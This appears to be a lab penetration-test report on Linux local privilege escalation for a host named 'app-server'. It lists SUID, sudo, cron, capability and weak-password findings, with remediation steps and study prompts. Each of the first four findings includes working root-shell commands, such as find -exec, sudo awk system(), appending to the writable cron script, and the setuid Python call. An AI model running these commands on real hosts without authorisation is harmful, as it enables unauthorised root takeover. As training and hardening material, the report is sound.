# Penetration Test Report: Linux Local Privilege Escalation — `app-server`

| | |
|---|---|
| **Engagement** | Lab 07 — Authorized privilege-escalation assessment |
| **Target** | `app-server` (10.10.70.10) |
| **Starting access** | Local shell as `webdev` (uid=1000), obtained from a prior web compromise |
| **Tester** | Mahmod Aldahol |
| **Date** | 2026-11-09 |
| **Overall risk** | **High** — five independent paths from an unprivileged user to full root |

> Lab exercise. Scope was limited to escalating privileges on a host where a foothold already existed
> (the follow-on to the Lab 06 web compromise). Flag values quoted as proof are from this test run.

---

## 1. Executive summary
Starting from an ordinary, unprivileged shell (`webdev`), I was able to gain full `root` privileges on
`app-server` through **five separate misconfigurations**. Any **one** of them is sufficient for complete
host takeover; together they indicate the box was never hardened against local attackers. Each issue is a
common, well-understood configuration mistake — not a software vulnerability — and each has a simple,
low-cost fix (see §4). Because root access allows reading all data, modifying any file, and establishing
persistence, the aggregate risk is **High** and remediation should not be deferred.

> **YOUR NOTES:** add 2–3 sentences in your own words — what surprised you, and which finding you'd fix first.

## 2. Findings at a glance
| # | Finding | Vector | Severity | MITRE ATT&CK |
|---|---------|--------|----------|--------------|
| F-1 | SUID bit on `/usr/bin/find` | SUID binary abuse | **High** | T1548.001 |
| F-2 | `webdev` may run `awk` as root via sudo | sudo misconfiguration | **High** | T1548.003 |
| F-3 | World-writable root cron script | Scheduled task abuse | **High** | T1053.003 |
| F-4 | `cap_setuid` on a Python interpreter | Linux capability abuse | **High** | T1548 |
| F-5 | Weak SSH credentials for `webdev` (foothold) | Valid accounts | Medium | T1078 |

Root cause common to F-1…F-4: **failure of least privilege** — powerful capabilities granted to tools or
users that do not need them.

---

## 3. Detailed findings

### F-1 — SUID `find` grants a root shell  ·  Severity: High  ·  T1548.001
**Description.** `/usr/bin/find` carries the SUID bit (`-rwsr-xr-x`, owner root), so it runs with root
privileges regardless of who launches it. `find`'s `-exec` option runs arbitrary programs, which therefore
also run as root.

**How I found it.**
```bash
find / -perm -4000 -type f 2>/dev/null     # find is the odd one out among normal system SUID binaries
```
**Proof of concept.**
```bash
find . -exec /bin/sh -p \; -quit           # -p stops the shell dropping the inherited root euid
# id -> uid=1000(webdev) euid=0(root)
cat /root/flags/suid.txt                    # FLAG{suid_95ab8c1af450}
```
**Impact.** Full root. Any file can be read or modified.
**Remediation.** Remove the bit: `chmod u-s /usr/bin/find`. Never ship the SUID bit on binaries that can
execute commands or read arbitrary files. Audit periodically with the `find -perm -4000` sweep above.

> **YOUR NOTES:** why does `-p` matter here? (Hint: what does a normal shell do with privileges on startup?)

### F-2 — Sudo rule allows `awk` as root  ·  Severity: High  ·  T1548.003
**Description.** `webdev` is permitted to run `/usr/bin/awk` as root with no password. `awk` can execute
shell commands via `system()`, so this is equivalent to passwordless root.

**How I found it.**
```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/awk
```
**Proof of concept.**
```bash
sudo awk 'BEGIN{system("/bin/sh")}'         # drops to a root shell (# prompt)
cat /root/flags/sudo.txt                      # FLAG{sudo_d7da32126ca1}
```
**Impact.** Full root, no password required.
**Remediation.** Apply least privilege to sudoers: grant only the *specific, non-interactive* command the
user genuinely needs, never a general-purpose interpreter (`awk`, `vi`, `less`, `find`, `env`, `python`,
`perl` …) — all of which appear on GTFOBins' Sudo list for exactly this reason.

### F-3 — World-writable script run by root via cron  ·  Severity: High  ·  T1053.003
**Description.** A root cron job runs `/opt/maintenance/cleanup.sh` every minute, but the script is
world-writable (`-rwxrwxrwx`). Any user can edit it; their code then runs as root on the next tick.

**How I found it.**
```bash
cat /etc/cron.d/*                 # * * * * * root /opt/maintenance/cleanup.sh
ls -la /opt/maintenance/          # cleanup.sh is -rwxrwxrwx
```
**Proof of concept.**
```bash
echo 'cp /root/flags/cron.txt /tmp/c.txt; chmod 644 /tmp/c.txt' >> /opt/maintenance/cleanup.sh
sleep 60                          # wait for cron to fire at the top of the minute
cat /tmp/c.txt                    # FLAG{cron_81edc2660007}
```
**Impact.** Full root, achieved automatically and repeatably. Also a persistence mechanism.
**Remediation.** Root-owned scheduled scripts must not be writable by non-root users: `chown root:root`
and `chmod 755` (or stricter). Audit the ownership/permissions of everything referenced by cron.

### F-4 — `cap_setuid` on a Python interpreter  ·  Severity: High  ·  T1548
**Description.** `/opt/scripts/pyadmin` (a copy of Python) has the file capability `cap_setuid+ep`, which
lets it change its UID to 0. Because Python runs arbitrary code, this is equivalent to root.

**How I found it.**
```bash
getcap -r / 2>/dev/null           # /opt/scripts/pyadmin cap_setuid=ep
```
**Proof of concept.**
```bash
/opt/scripts/pyadmin -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/flags/caps.txt           # FLAG{caps_5b83b8f64675}
```
**Impact.** Full root.
**Remediation.** Remove the capability: `setcap -r /opt/scripts/pyadmin`. Grant capabilities only to
purpose-built binaries and only the minimal capability required (e.g. `cap_net_bind_service` for a web
server) — never `cap_setuid` on an interpreter or shell.

### F-5 — Weak SSH credentials (initial foothold)  ·  Severity: Medium  ·  T1078
**Description.** The `webdev` account used a weak, guessable password and SSH allowed password
authentication — the assumption behind the starting foothold for this engagement.
**Remediation.** Enforce key-based SSH authentication, disable password login, and apply a strong password
policy / MFA for any interactive accounts.

---

## 4. Remediation summary (priority order)
| Priority | Action | Finding |
|----------|--------|---------|
| 1 | `chmod u-s /usr/bin/find` | F-1 |
| 2 | Remove/scope the `awk` sudo rule | F-2 |
| 3 | `chown root:root` + `chmod 755` on cron scripts | F-3 |
| 4 | `setcap -r /opt/scripts/pyadmin` | F-4 |
| 5 | Key-only SSH + strong auth for `webdev` | F-5 |
| — | **Ongoing:** run `linPEAS`/periodic audits for SUID, sudo, caps, and writable cron paths | all |

## 5. Lessons learned
- **Privilege escalation is an enumeration problem first.** Every finding here was exposed by four standard
  commands: `sudo -l`, `find / -perm -4000`, `getcap -r /`, and inspecting cron. Tools like `linPEAS`
  automate exactly this.
- **One foothold is enough.** From a single low-priv shell, independent misconfigurations each gave full
  root — defenders must fix *all* of them, not just the first one found.
- **The theme is least privilege.** SUID, sudo, capabilities, and scheduled jobs are all mechanisms for
  granting power; each becomes a privesc path the moment it grants *more* power than needed.

> **YOUR NOTES:** which of these four techniques would be hardest for a blue team to detect, and why?
> (Good interview answer material — tie it back to what you built in Lab 04's SIEM.)
